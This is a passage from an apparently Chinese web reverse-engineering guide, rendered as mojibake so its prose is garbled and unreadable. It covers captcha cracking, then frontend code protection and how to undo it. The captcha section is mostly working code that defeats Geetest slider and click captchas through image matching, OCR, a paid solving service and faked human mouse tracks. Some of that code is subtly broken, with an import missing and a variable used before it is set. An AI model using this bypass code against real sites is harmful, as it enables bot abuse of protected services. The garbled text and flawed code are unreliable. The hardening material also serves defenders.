   - æ˜¯å¦ç¬¦åˆäººç±»è¡Œä¸º
8. è¿”å›éªŒè¯ç»“æœ
</code></pre>
<p><strong>ç ´è§£æ–¹æ³•</strong>:</p>
<p><strong>æ–¹æ³• 1: å›¾åƒè¯†åˆ« + è½¨è¿¹æ¨¡æ‹Ÿ</strong></p>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from PIL import Image
import cv2
import numpy as np
import time
import random

class SliderCracker:
    def __init__(self, driver):
        self.driver = driver

    def get_gap_distance(self, bg_img, slide_img):
        &quot;&quot;&quot;è®¡ç®—ç¼ºå£è·ç¦»&quot;&quot;&quot;
        # 1. è½¬æ¢ä¸ºç°åº¦å›¾
        bg_gray = cv2.cvtColor(np.array(bg_img), cv2.COLOR_RGB2GRAY)
        slide_gray = cv2.cvtColor(np.array(slide_img), cv2.COLOR_RGB2GRAY)

        # 2. è¾¹ç¼˜æ£€æµ‹
        bg_edges = cv2.Canny(bg_gray, 100, 200)

        # 3. æ¨¡æ¿åŒ¹é…
        result = cv2.matchTemplate(bg_edges, slide_gray, cv2.TM_CCOEFF_NORMED)
        min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result)

        # 4. è¿”å›åŒ¹é…ä½ç½®ï¼ˆç¼ºå£è·ç¦»ï¼‰
        return max_loc[0]

    def get_track(self, distance):
        &quot;&quot;&quot;ç”Ÿæˆæ‹–åŠ¨è½¨è¿¹ï¼ˆæ¨¡æ‹Ÿäººç±»è¡Œä¸ºï¼‰&quot;&quot;&quot;
        track = []
        current = 0
        mid = distance * 4 / 5  # å‡é€Ÿç‚¹
        t = 0.2  # æ—¶é—´é—´éš”
        v = 0  # åˆé€Ÿåº¦

        while current &lt; distance:
            if current &lt; mid:
                a = 2  # åŠ é€Ÿåº¦
            else:
                a = -3  # å‡é€Ÿ

            v0 = v
            v = v0 + a * t
            move = v0 * t + 1/2 * a * t * t
            current += move

            track.append(round(move))

        return track

    def move_slider(self, slider, track):
        &quot;&quot;&quot;ç§»åŠ¨æ»‘å—&quot;&quot;&quot;
        ActionChains(self.driver).click_and_hold(slider).perform()

        for x in track:
            ActionChains(self.driver).move_by_offset(xoffset=x, yoffset=0).perform()
            time.sleep(random.uniform(0.001, 0.002))

        # éšæœºæŠ–åŠ¨ï¼ˆæ¨¡æ‹Ÿäººç±»ä¿®æ­£ï¼‰
        for _ in range(3):
            ActionChains(self.driver).move_by_offset(
                xoffset=random.uniform(-2, 2),
                yoffset=random.uniform(-2, 2)
            ).perform()
            time.sleep(random.uniform(0.01, 0.02))

        ActionChains(self.driver).release().perform()

    def crack(self):
        &quot;&quot;&quot;ç ´è§£æ»‘å—éªŒè¯ç &quot;&quot;&quot;
        # 1. ç­‰å¾…éªŒè¯ç åŠ è½½
        time.sleep(2)

        # 2. è·å–èƒŒæ™¯å›¾å’Œæ»‘å—å›¾
        bg_element = self.driver.find_element(By.CLASS_NAME, 'geetest_canvas_bg')
        slide_element = self.driver.find_element(By.CLASS_NAME, 'geetest_canvas_slice')

        # 3. æˆªå›¾
        bg_img = Image.open(BytesIO(bg_element.screenshot_as_png))
        slide_img = Image.open(BytesIO(slide_element.screenshot_as_png))

        # 4. è®¡ç®—ç¼ºå£è·ç¦»
        distance = self.get_gap_distance(bg_img, slide_img)

        # 5. ç”Ÿæˆè½¨è¿¹
        track = self.get_track(distance - 7)  # å‡å»æ»‘å—å®½åº¦

        # 6. æ‹–åŠ¨æ»‘å—
        slider = self.driver.find_element(By.CLASS_NAME, 'geetest_slider_button')
        self.move_slider(slider, track)

        # 7. ç­‰å¾…éªŒè¯ç»“æœ
        time.sleep(2)
</code></pre>
<p><strong>æ–¹æ³• 2: æ·±åº¦å­¦ä¹ è¯†åˆ«</strong></p>
<pre><code class="language-python">import tensorflow as tf
from tensorflow.keras import layers, models

class CaptchaCNN:
    def __init__(self):
        self.model = self.build_model()

    def build_model(self):
        &quot;&quot;&quot;æ„å»º CNN æ¨¡å‹&quot;&quot;&quot;
        model = models.Sequential([
            layers.Conv2D(32, (3, 3), activation='relu', input_shape=(60, 260, 3)),
            layers.MaxPooling2D((2, 2)),
            layers.Conv2D(64, (3, 3), activation='relu'),
            layers.MaxPooling2D((2, 2)),
            layers.Conv2D(64, (3, 3), activation='relu'),
            layers.Flatten(),
            layers.Dense(64, activation='relu'),
            layers.Dense(1, activation='linear')  # è¾“å‡ºç¼ºå£ä½ç½®
        ])

        model.compile(
            optimizer='adam',
            loss='mse',
            metrics=['mae']
        )

        return model

    def train(self, X_train, y_train, epochs=50):
        &quot;&quot;&quot;è®­ç»ƒæ¨¡å‹&quot;&quot;&quot;
        self.model.fit(
            X_train, y_train,
            epochs=epochs,
            validation_split=0.2
        )

    def predict_gap(self, image):
        &quot;&quot;&quot;é¢„æµ‹ç¼ºå£ä½ç½®&quot;&quot;&quot;
        image = np.expand_dims(image, axis=0)
        return self.model.predict(image)[0][0]
</code></pre>
<p><strong>æ–¹æ³• 3: æ‰“ç å¹³å°</strong></p>
<pre><code class="language-python">import requests

class OCRService:
    def __init__(self, api_key):
        self.api_key = api_key
        self.api_url = 'http://api.ttshitu.com/predict'

    def recognize_slider(self, bg_img_path, slide_img_path):
        &quot;&quot;&quot;ä½¿ç”¨æ‰“ç å¹³å°è¯†åˆ«æ»‘å—éªŒè¯ç &quot;&quot;&quot;
        with open(bg_img_path, 'rb') as f:
            bg_img = f.read()
        with open(slide_img_path, 'rb') as f:
            slide_img = f.read()

        data = {
            'username': 'your_username',
            'password': 'your_password',
            'typeid': '33',  # æ»‘å—éªŒè¯ç ç±»å‹
            'image': base64.b64encode(bg_img).decode(),
            'slide': base64.b64encode(slide_img).decode()
        }

        response = requests.post(self.api_url, json=data)
        result = response.json()

        return result['data']['result']  # è¿”å›ç¼ºå£è·ç¦»
</code></pre>
<h4>8.4 ç‚¹é€‰éªŒè¯ç </h4>
<p><strong>åŸç†</strong>: ç”¨æˆ·éœ€è¦æŒ‰é¡ºåºç‚¹å‡»æŒ‡å®šçš„æ–‡å­—æˆ–å›¾ç‰‡ã€‚</p>
<p><strong>ç ´è§£æ–¹æ³•</strong>:</p>
<pre><code class="language-python">from paddleocr import PaddleOCR

class ClickCaptchaCracker:
    def __init__(self):
        self.ocr = PaddleOCR(use_angle_cls=True, lang='ch')

    def recognize_text(self, image_path):
        &quot;&quot;&quot;è¯†åˆ«å›¾ç‰‡ä¸­çš„æ–‡å­—ä½ç½®&quot;&quot;&quot;
        result = self.ocr.ocr(image_path, cls=True)

        text_positions = []
        for line in result:
            for word_info in line:
                box = word_info[0]  # åæ ‡
                text = word_info[1][0]  # æ–‡å­—
                confidence = word_info[1][1]  # ç½®ä¿¡åº¦

                # è®¡ç®—ä¸­å¿ƒç‚¹
                center_x = (box[0][0] + box[2][0]) / 2
                center_y = (box[0][1] + box[2][1]) / 2

                text_positions.append({
                    'text': text,
                    'x': center_x,
                    'y': center_y,
                    'confidence': confidence
                })

        return text_positions

    def click_sequence(self, driver, target_texts, positions):
        &quot;&quot;&quot;æŒ‰é¡ºåºç‚¹å‡»æŒ‡å®šæ–‡å­—&quot;&quot;&quot;
        for target_text in target_texts:
            for pos in positions:
                if pos['text'] == target_text:
                    # ç‚¹å‡»è¯¥ä½ç½®
                    element = driver.find_element(By.CLASS_NAME, 'captcha-image')
                    ActionChains(driver).move_to_element_with_offset(
                        element,
                        pos['x'],
                        pos['y']
                    ).click().perform()
                    time.sleep(0.5)
                    break
</code></pre>
<h4>8.5 è¡Œä¸ºéªŒè¯ç </h4>
<p><strong>æ£€æµ‹ç»´åº¦</strong>:</p>
<ol>
<li><strong>é¼ æ ‡è½¨è¿¹</strong>: æ›²çº¿æ˜¯å¦å¹³æ»‘ã€æ˜¯å¦ç¬¦åˆè´å¡å°”æ›²çº¿</li>
<li><strong>é€Ÿåº¦å˜åŒ–</strong>: æ˜¯å¦æœ‰åŠ é€Ÿåº¦å˜åŒ–</li>
<li><strong>ç‚¹å‡»æ—¶æœº</strong>: ä½•æ—¶å¼€å§‹æ‹–åŠ¨ã€ä½•æ—¶é‡Šæ”¾</li>
<li><strong>è®¾å¤‡æŒ‡çº¹</strong>: Canvasã€WebGLã€å­—ä½“åˆ—è¡¨ç­‰</li>
<li><strong>ç¯å¢ƒä¿¡æ¯</strong>: IPã€User-Agentã€æµè§ˆå™¨ç‰ˆæœ¬</li>
<li><strong>å†å²è¡Œä¸º</strong>: è¯¥ç”¨æˆ·/IP çš„å†å²éªŒè¯è®°å½•</li>
</ol>
<p><strong>å¯¹æŠ—ç­–ç•¥</strong>:</p>
<pre><code class="language-python">import numpy as np
import random

class HumanBehaviorSimulator:
    @staticmethod
    def bezier_curve(start, end, control_points, steps=100):
        &quot;&quot;&quot;ç”Ÿæˆè´å¡å°”æ›²çº¿è½¨è¿¹&quot;&quot;&quot;
        points = [start] + control_points + [end]
        n = len(points) - 1
        curve = []

        for t in np.linspace(0, 1, steps):
            point = [0, 0]
            for i, p in enumerate(points):
                binomial = np.math.comb(n, i) * (1 - t)**(n - i) * t**i
                point[0] += binomial * p[0]
                point[1] += binomial * p[1]
            curve.append(point)

        return curve

    @staticmethod
    def add_random_jitter(track, max_jitter=2):
        &quot;&quot;&quot;æ·»åŠ éšæœºæŠ–åŠ¨&quot;&quot;&quot;
        jittered_track = []
        for point in track:
            jittered_track.append([
                point[0] + random.uniform(-max_jitter, max_jitter),
                point[1] + random.uniform(-max_jitter, max_jitter)
            ])
        return jittered_track

    @staticmethod
    def simulate_drag(driver, element, distance):
        &quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»æ‹–åŠ¨è¡Œä¸º&quot;&quot;&quot;
        # 1. ç”Ÿæˆæ§åˆ¶ç‚¹
        control_points = [
            [random.uniform(distance * 0.3, distance * 0.4), random.uniform(-5, 5)],
            [random.uniform(distance * 0.6, distance * 0.7), random.uniform(-5, 5)]
        ]

        # 2. ç”Ÿæˆæ›²çº¿
        curve = HumanBehaviorSimulator.bezier_curve(
            [0, 0], [distance, 0], control_points
        )

        # 3. æ·»åŠ æŠ–åŠ¨
        curve = HumanBehaviorSimulator.add_random_jitter(curve)

        # 4. æ‰§è¡Œæ‹–åŠ¨
        ActionChains(driver).click_and_hold(element).perform()

        for point in curve:
            ActionChains(driver).move_by_offset(
                point[0] - last_x,
                point[1] - last_y
            ).perform()
            time.sleep(random.uniform(0.001, 0.003))
            last_x, last_y = point

        # 5. é‡Šæ”¾å‰çš„åœé¡¿
        time.sleep(random.uniform(0.1, 0.3))
        ActionChains(driver).release().perform()
</code></pre>
<h4>8.6 æˆæœ¬åˆ†æ</h4>
<table>
<thead>
<tr>
  <th>éªŒè¯ç ç±»å‹</th>
  <th>ç ´è§£æˆæœ¬ï¼ˆ2025ï¼‰</th>
  <th>æˆåŠŸç‡</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td>æ™®é€šå›¾å½¢éªŒè¯ç </td>
  <td>Â¥0.001-0.005/æ¬¡</td>
  <td>95%+</td>
  <td>OCR è¯†åˆ«</td>
</tr>
<tr>
  <td>æ»‘å—éªŒè¯ç ï¼ˆæ— é£æ§ï¼‰</td>
  <td>Â¥0.01-0.05/æ¬¡</td>
  <td>80-90%</td>
  <td>å›¾åƒè¯†åˆ« + è½¨è¿¹æ¨¡æ‹Ÿ</td>
</tr>
<tr>
  <td>æéªŒ/æ˜“ç›¾ï¼ˆå¸¦é£æ§ï¼‰</td>
  <td>Â¥1-5/æ¬¡</td>
  <td>60-80%</td>
  <td>æ·±åº¦å­¦ä¹  + è¡Œä¸ºæ¨¡æ‹Ÿ</td>
</tr>
<tr>
  <td>æ™ºèƒ½éªŒè¯ç </td>
  <td>Â¥5-20/æ¬¡</td>
  <td>40-60%</td>
  <td>éœ€è¦å¤§é‡è®¾å¤‡æŒ‡çº¹ä¼ªé€ </td>
</tr>
</tbody>
</table>
<p><strong>å¯¹æ¯”</strong>: æ™ºèƒ½å¸¦é£æ§çš„éªŒè¯ç ç ´è§£æˆæœ¬æ˜¯æ™®é€šéªŒè¯ç çš„ <strong>100-1000 å€</strong>ã€‚</p>
<p><strong>å‚è€ƒèµ„æº</strong>:</p>
<ul>
<li><a href="https://blog.csdn.net/qq_44866828/article/details/148482799">2025 æœ€æ–°æ»‘å—éªŒè¯ç ã€å›¾å½¢éªŒè¯ç è§£å†³æ–¹æ¡ˆ</a></li>
<li><a href="https://www.aneasystone.com/archives/2018/03/python-selenium-geetest-crack.html">ä½¿ç”¨ Python + Selenium ç ´è§£æ»‘å—éªŒè¯ç </a></li>
<li><a href="https://www.aqniu.com/tools-tech/29545.html">éªŒè¯ç å“ªå®¶å¼ºï¼Ÿå…­å¤§éªŒè¯å¹³å°è¯„æµ‹</a></li>
<li><a href="https://www.cnblogs.com/worktile/articles/18958534">æ»‘å—éªŒè¯ç èƒ½è¢«æœºå™¨ç ´è§£å—</a></li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-34">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-42">TLS æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-41">Canvas æŒ‡çº¹æŠ€æœ¯</a></li>
<li><a href="#section-52">ä»£ç†æ± ç®¡ç†</a></li>
<li><a href="#section-58">JavaScript Hook æŠ€æœ¯</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-38">
                                                <h2>[R37] Frontend Hardening</h2>
                                                <h1>R37: å‰ç«¯åŠ å›ºæŠ€æœ¯è¯¦è§£</h1>
<h2>æ¦‚è¿°</h2>
<p>å‰ç«¯åŠ å›ºæ˜¯ä¿æŠ¤ Web åº”ç”¨ä»£ç å’Œé€»è¾‘ä¸è¢«è½»æ˜“åˆ†æçš„æŠ€æœ¯é›†åˆã€‚éšç€å‰ç«¯åº”ç”¨å¤æ‚åº¦å¢åŠ ï¼Œè¶Šæ¥è¶Šå¤šçš„ä¸šåŠ¡é€»è¾‘ç§»è‡³å‰ç«¯ï¼Œä»£ç ä¿æŠ¤å˜å¾—å°¤ä¸ºé‡è¦ã€‚æœ¬ç« ä»‹ç»ä¸»æµçš„å‰ç«¯åŠ å›ºæ‰‹æ®µã€å®ç°åŸç†åŠé€†å‘åˆ†ææ–¹æ³•ã€‚</p>
<hr />
<h2>ä»£ç æ··æ·† (Code Obfuscation)</h2>
<h3>1. å˜é‡åæ··æ·† (Identifier Mangling)</h3>
<p><strong>åŸç†</strong>: å°†æœ‰æ„ä¹‰çš„å˜é‡åã€å‡½æ•°åæ›¿æ¢ä¸ºæ— æ„ä¹‰çš„çŸ­å­—ç¬¦ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// åŸå§‹ä»£ç 
function calculateUserAge(birthYear) {
  const currentYear = new Date().getFullYear();
  return currentYear - birthYear;
}

// æ··æ·†å
function _0x3a2b(_0x1c4d, _0x5e6f) {
  const _0x7a8b = new Date().getFullYear();
  return _0x7a8b - _0x1c4d;
}
</code></pre>
<p><strong>å·¥å…·</strong>:</p>
<ul>
<li>JavaScript Obfuscator</li>
<li>Terser (å‹ç¼©å™¨ï¼Œéƒ¨åˆ†æ··æ·†)</li>
<li>Closure Compiler</li>
</ul>
<p><strong>ç ´è§£æ–¹æ³•</strong>:</p>
<ul>
<li>é‡å‘½åä¸ºæœ‰æ„ä¹‰çš„åç§°</li>
<li>ä½¿ç”¨ IDE çš„é‡æ„åŠŸèƒ½</li>
<li>é€šè¿‡ä¸Šä¸‹æ–‡æ¨æ–­å˜é‡ç”¨é€”</li>
</ul>
<h3>2. å­—ç¬¦ä¸²åŠ å¯† (String Encryption)</h3>
<p><strong>åŸç†</strong>: å°†å­—ç¬¦ä¸²åŠ å¯†å­˜å‚¨ï¼Œè¿è¡Œæ—¶è§£å¯†ä½¿ç”¨ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// åŸå§‹ä»£ç 
const apiUrl = &quot;https://api.example.com/users&quot;;
fetch(apiUrl);

// æ··æ·†å
const _0x4a2c = [&quot;aHR0cHM6Ly9hcGkuZXhhbXBsZS5jb20vdXNlcnM=&quot;];
const _0x1b3d = function (_0x2c4e) {
  return atob(_0x2c4e);
};
fetch(_0x1b3d(_0x4a2c[0]));
</code></pre>
<p><strong>å¸¸è§ç¼–ç æ–¹å¼</strong>:</p>
<ul>
<li>Base64</li>
<li>è‡ªå®šä¹‰ç¼–ç è¡¨</li>
<li>XOR åŠ å¯†</li>
<li>RC4 æµå¯†ç </li>
</ul>
<p><strong>ç ´è§£æ–¹æ³•</strong>:</p>
<pre><code class="language-javascript">// Hook è§£å¯†å‡½æ•°
const original_atob = window.atob;
window.atob = function (str) {
  const result = original_atob(str);
  console.log(&quot;Decoded:&quot;, str, &quot;-&gt;&quot;, result);
  return result;
};

// æˆ–è€…ç›´æ¥è°ƒç”¨è§£å¯†å‡½æ•°
_0x1b3d(_0x4a2c[0]); // æŸ¥çœ‹ç»“æœ
</code></pre>
<h3>3. æ§åˆ¶æµå¹³å¦åŒ– (Control Flow Flattening)</h3>
<p><strong>åŸç†</strong>: æ‰“ä¹±ä»£ç æ‰§è¡Œé¡ºåºï¼Œä½¿ç”¨ switch-case æˆ–çŠ¶æ€æœºç»“æ„ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// åŸå§‹ä»£ç 
function process(data) {
  let result = validate(data);
  result = transform(result);
  result = encrypt(result);
  return result;
}

// å¹³å¦åŒ–å
function process(data) {
  let _0x1 = 0;
  let result;
  while (true) {
    switch (_0x1) {
      case 0:
        result = validate(data);
        _0x1 = 2;
        break;
      case 2:
        result = transform(result);
        _0x1 = 1;
        break;
      case 1:
        result = encrypt(result);
        _0x1 = 3;
        break;
      case 3:
        return result;
    }
  }
}
</code></pre>
<p><strong>ç ´è§£æ–¹æ³•</strong>:</p>
<ul>
<li>ç¬¦å·æ‰§è¡Œæ¢å¤æ§åˆ¶æµ</li>
<li>åŠ¨æ€è°ƒè¯•è¿½è¸ªæ‰§è¡Œè·¯å¾„</li>
<li>ä½¿ç”¨ AST åˆ†æå·¥å…·é‡æ„</li>
</ul>
<h3>4. åƒµå°¸ä»£ç æ³¨å…¥ (Dead Code Injection)</h3>
<p><strong>åŸç†</strong>: æ’å…¥æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç ï¼Œå¢åŠ åˆ†æéš¾åº¦ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">function login(username, password) {
  // çœŸå®é€»è¾‘
  if (username &amp;&amp; password) {
    return authenticate(username, password);
  }

  // åƒµå°¸ä»£ç ï¼ˆæ°¸è¿œä¸ä¼šæ‰§è¡Œï¼‰
  if (false) {
    console.log(&quot;This code never runs&quot;);
    fetch(&quot;/fake-endpoint&quot;);
    const fake = CryptoJS.MD5(username).toString();
  }

  // æ›´å¤šåƒµå°¸ä»£ç 
  return void 0;
}
</code></pre>
<p><strong>ç ´è§£æ–¹æ³•</strong>:</p>
<ul>
<li>ä»£ç è¦†ç›–ç‡åˆ†æ</li>
<li>åŠ¨æ€æ‰§è¡Œè¿½è¸ª</li>
<li>åˆ é™¤ä¸å¯è¾¾ä»£ç </li>
</ul>
<h3>5. å¸¸é‡æŠ˜å åæ··æ·† (Constant Unfolding)</h3>
<p><strong>åŸç†</strong>: å°†ç®€å•å¸¸é‡æ‹†åˆ†ä¸ºå¤æ‚è¡¨è¾¾å¼ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// åŸå§‹
const timeout = 5000;

// æ··æ·†å
const timeout = 0x3e8 * 0x5 + (0x1f4 - 0x64) + (0xc8 | 0x32);
// = (1000 * 5) + (500 - 100) + (200 | 50)
</code></pre>
<p><strong>ç ´è§£æ–¹æ³•</strong>:</p>
<pre><code class="language-javascript">// ä½¿ç”¨ JavaScript å¼•æ“è‡ªåŠ¨è®¡ç®—
console.log(0x3e8 * 0x5 + (0x1f4 - 0x64) + (0xc8 | 0x32));
</code></pre>
<h3>6. å¯¹è±¡é”®éšè—</h3>
<p><strong>åŸç†</strong>: ä½¿ç”¨è®¡ç®—å±æ€§åéšè—å¯¹è±¡é”®ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// åŸå§‹
const config = {
  apiKey: &quot;secret123&quot;,
  endpoint: &quot;/api/data&quot;,
};

// æ··æ·†å
const _0x1a = [&quot;apiKey&quot;, &quot;endpoint&quot;];
const config = {
  [_0x1a[0]]: &quot;secret123&quot;,
  [_0x1a[1]]: &quot;/api/data&quot;,
};
</code></pre>
<hr />
<h2>JavaScript è™šæ‹Ÿæœºä¿æŠ¤ (VM Protection)</h2>
<h3>åŸç†</h3>
<p>å°† JavaScript ä»£ç ç¼–è¯‘ä¸ºè‡ªå®šä¹‰å­—èŠ‚ç ï¼Œè¿è¡Œæ—¶ç”±è™šæ‹Ÿæœºè§£é‡Šæ‰§è¡Œã€‚</p>
<p><strong>æµç¨‹</strong>:</p>
<pre><code>åŸå§‹ä»£ç  â†’ ç¼–è¯‘å™¨ â†’ å­—èŠ‚ç  â†’ è™šæ‹Ÿæœº â†’ æ‰§è¡Œ
</code></pre>
<h3>å®ç°æ¶æ„</h3>
<p><strong>1. å­—èŠ‚ç è®¾è®¡</strong>:</p>
<pre><code class="language-javascript">// ç¤ºä¾‹å­—èŠ‚ç æŒ‡ä»¤é›†
const OPCODES = {
  PUSH: 0x01, // å‹æ ˆ
  POP: 0x02, // å‡ºæ ˆ
  ADD: 0x03, // åŠ æ³•
  SUB: 0x04, // å‡æ³•
  CALL: 0x05, // å‡½æ•°è°ƒç”¨
  RET: 0x06, // è¿”å›
  JMP: 0x07, // è·³è½¬
  LOAD: 0x08, // åŠ è½½å˜é‡
  STORE: 0x09, // å­˜å‚¨å˜é‡
};
</code></pre>
<p><strong>2. è™šæ‹Ÿæœºå®ç°</strong>:</p>
<pre><code class="language-javascript">class VM {
  constructor(bytecode) {
    this.bytecode = bytecode;
    this.stack = [];
    this.pc = 0; // Program Counter
    this.vars = {};
  }

  execute() {
    while (this.pc &lt; this.bytecode.length) {
      const opcode = this.bytecode[this.pc++];

      switch (opcode) {
        case OPCODES.PUSH:
          const value = this.bytecode[this.pc++];
          this.stack.push(value);
          break;

        case OPCODES.ADD:
          const b = this.stack.pop();
          const a = this.stack.pop();
          this.stack.push(a + b);
          break;

        case OPCODES.CALL:
          const funcId = this.bytecode[this.pc++];
          this.callFunction(funcId);
          break;

        // å…¶ä»–æŒ‡ä»¤...
      }
    }
  }
}
</code></pre>
<p><strong>3. ç¼–è¯‘å™¨</strong>:</p>
<pre><code class="language-javascript">function compile(ast) {
  const bytecode = [];

  function visit(node) {
    switch (node.type) {
      case &quot;BinaryExpression&quot;:
        visit(node.left);
        visit(node.right);
        bytecode.push(getOpcode(node.operator));
        break;

      case &quot;Literal&quot;:
        bytecode.push(OPCODES.PUSH);
        bytecode.push(node.value);
        break;

      // å…¶ä»–èŠ‚ç‚¹ç±»å‹...
    }
  }

  visit(ast);
  return bytecode;
}
</code></pre>
<h3>å•†ä¸šåŒ–è™šæ‹Ÿæœºä¿æŠ¤</h3>
<p><strong>JScrambler</strong>:</p>
<ul>
<li>å¤šå±‚è™šæ‹ŸæœºåµŒå¥—</li>
<li>è‡ªä¿®æ”¹ä»£ç </li>
<li>åè°ƒè¯•æ£€æµ‹</li>
</ul>
<p><strong>JShaman</strong>:</p>
<ul>
<li>åŸç”Ÿä»£ç æ··åˆï¼ˆNode.js æ’ä»¶ï¼‰</li>
<li>ä»£ç åŠ å¯†</li>
<li>è¿è¡Œæ—¶è§£å¯†</li>
</ul>
<p>è¯¦è§ <a href="#section-35">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</a></p>
<hr />
<h2>WebAssembly ç¼–è¯‘</h2>
<p><strong>åŸç†</strong>: å°†æ ¸å¿ƒé€»è¾‘ç¼–è¯‘ä¸º WebAssembly äºŒè¿›åˆ¶æ ¼å¼ã€‚</p>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>æ¥è¿‘åŸç”Ÿæ€§èƒ½</li>
<li>äºŒè¿›åˆ¶æ ¼å¼ï¼Œéš¾ä»¥é€†å‘</li>
<li>è·¨å¹³å°æ”¯æŒ</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-c">// C ä»£ç 
int encrypt(int data, int key) {
    return (data ^ key) + 0x5A5A;
}
</code></pre>
<p>ç¼–è¯‘ä¸º WebAssembly:</p>
<pre><code class="language-bash">emcc encrypt.c -o encrypt.js -s EXPORTED_FUNCTIONS='[&quot;_encrypt&quot;]'
</code></pre>
<p>åœ¨ JavaScript ä¸­è°ƒç”¨:</p>
<pre><code class="language-javascript">const Module = require(&quot;./encrypt.js&quot;);
Module.onRuntimeInitialized = () =&gt; {
  const result = Module._encrypt(12345, 67890);
  console.log(&quot;Encrypted:&quot;, result);
};
</code></pre>
<p>è¯¦è§ <a href="#section-36">WebAssembly é€†å‘</a></p>
<hr />
<h2>é«˜çº§ä¿æŠ¤æŠ€æœ¯</h2>
<h3>1. ä»£ç åˆ†ç‰‡ (Code Splitting)</h3>
<p><strong>åŸç†</strong>: å°†ä»£ç åˆ†æ•£åˆ°å¤šä¸ªæ–‡ä»¶ï¼ŒåŠ¨æ€åŠ è½½ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// ä¸»æ–‡ä»¶åªåŒ…å«åŠ è½½å™¨
const loader = {
  async loadModule(name) {
    const response = await fetch(`/modules/${name}.js`);
    const code = await response.text();
    return eval(code);
  },
};

// ä½¿ç”¨æ—¶åŠ¨æ€åŠ è½½
const crypto = await loader.loadModule(&quot;crypto&quot;);
crypto.encrypt(data);
</code></pre>
<h3>2. ç¯å¢ƒæ£€æµ‹ä¸åè°ƒè¯•</h3>
<p><strong>æ£€æµ‹ DevTools</strong>:</p>
<pre><code class="language-javascript">// æ–¹æ³•1: æ£€æµ‹çª—å£å°ºå¯¸
(function () {
  const threshold = 160;
  setInterval(() =&gt; {
    if (
      window.outerHeight - window.innerHeight &gt; threshold ||
      window.outerWidth - window.innerWidth &gt; threshold
    ) {
      console.log(&quot;DevTools detected!&quot;);
      debugger; // è§¦å‘æ–­ç‚¹
    }
  }, 1000);
})();

// æ–¹æ³•2: åˆ©ç”¨ toString æ£€æµ‹
(function () {
  const element = new Image();
  Object.defineProperty(element, &quot;id&quot;, {
    get: function () {
      console.log(&quot;DevTools detected via property access!&quot;);
      debugger;
    },
  });
  console.log(element);
})();

// æ–¹æ³•3: æ£€æµ‹ console
(function () {
  const before = new Date();
  debugger;
  const after = new Date();

  if (after - before &gt; 100) {
    console.log(&quot;Debugger detected!&quot;);
    window.location = &quot;about:blank&quot;;
  }
})();
</code></pre>
<p><strong>æ£€æµ‹è‡ªåŠ¨åŒ–å·¥å…·</strong>:</p>
<pre><code class="language-javascript">// æ£€æµ‹ Selenium
if (navigator.webdriver) {
  console.log(&quot;Selenium detected!&quot;);
}

// æ£€æµ‹ Puppeteer/Playwright
if (window.navigator.plugins.length === 0) {
  console.log(&quot;Headless browser detected!&quot;);
}

// æ£€æµ‹ PhantomJS
if (window.callPhantom || window._phantom) {
  console.log(&quot;PhantomJS detected!&quot;);
}
</code></pre>
<h3>3. æ—¶é—´é” (Time Lock)</h3>
<p><strong>åŸç†</strong>: ä»£ç åœ¨ç‰¹å®šæ—¶é—´åå¤±æ•ˆã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">(function () {
  const expiryDate = new Date(&quot;2025-12-31&quot;);
  const now = new Date();

  if (now &gt; expiryDate) {
    throw new Error(&quot;This code has expired&quot;);
  }

  // æ­£å¸¸é€»è¾‘
})();
</code></pre>
<h3>4. åŸŸåç»‘å®š (Domain Lock)</h3>
<p><strong>åŸç†</strong>: ä»£ç åªåœ¨ç‰¹å®šåŸŸåä¸‹è¿è¡Œã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">(function () {
  const allowedDomains = [&quot;example.com&quot;, &quot;www.example.com&quot;];
  const currentDomain = window.location.hostname;

  if (!allowedDomains.includes(currentDomain)) {
    throw new Error(&quot;Unauthorized domain&quot;);
  }
})();
</code></pre>
<h3>5. ä»£ç å®Œæ•´æ€§æ ¡éªŒ</h3>
<p><strong>åŸç†</strong>: æ£€æµ‹ä»£ç æ˜¯å¦è¢«ä¿®æ”¹ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">function checkIntegrity() {
  const scriptContent = document.querySelector(&quot;script&quot;).textContent;
  const hash = CryptoJS.SHA256(scriptContent).toString();

  const expectedHash = &quot;abc123...&quot;; // é¢„å…ˆè®¡ç®—çš„å“ˆå¸Œ
  if (hash !== expectedHash) {
    throw new Error(&quot;Code tampering detected!&quot;);
  }
}

checkIntegrity();
</code></pre>
<hr />
<h2>é€†å‘åˆ†ææ–¹æ³•</h2>
<h3>1. è‡ªåŠ¨åŒ–åæ··æ·†å·¥å…·</h3>
<ul>
<li><strong>Prettier</strong>: ç¾åŒ–ä»£ç </li>
<li><strong>webcrack</strong>: è‡ªåŠ¨åæ··æ·†</li>
<li><strong>de4js</strong>: å¤šç§æ··æ·†å™¨çš„åæ··æ·†</li>
<li><strong>JSNice</strong>: å˜é‡é‡å‘½å</li>
</ul>
<p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>:</p>
<pre><code class="language-bash"># ä½¿ç”¨ webcrack
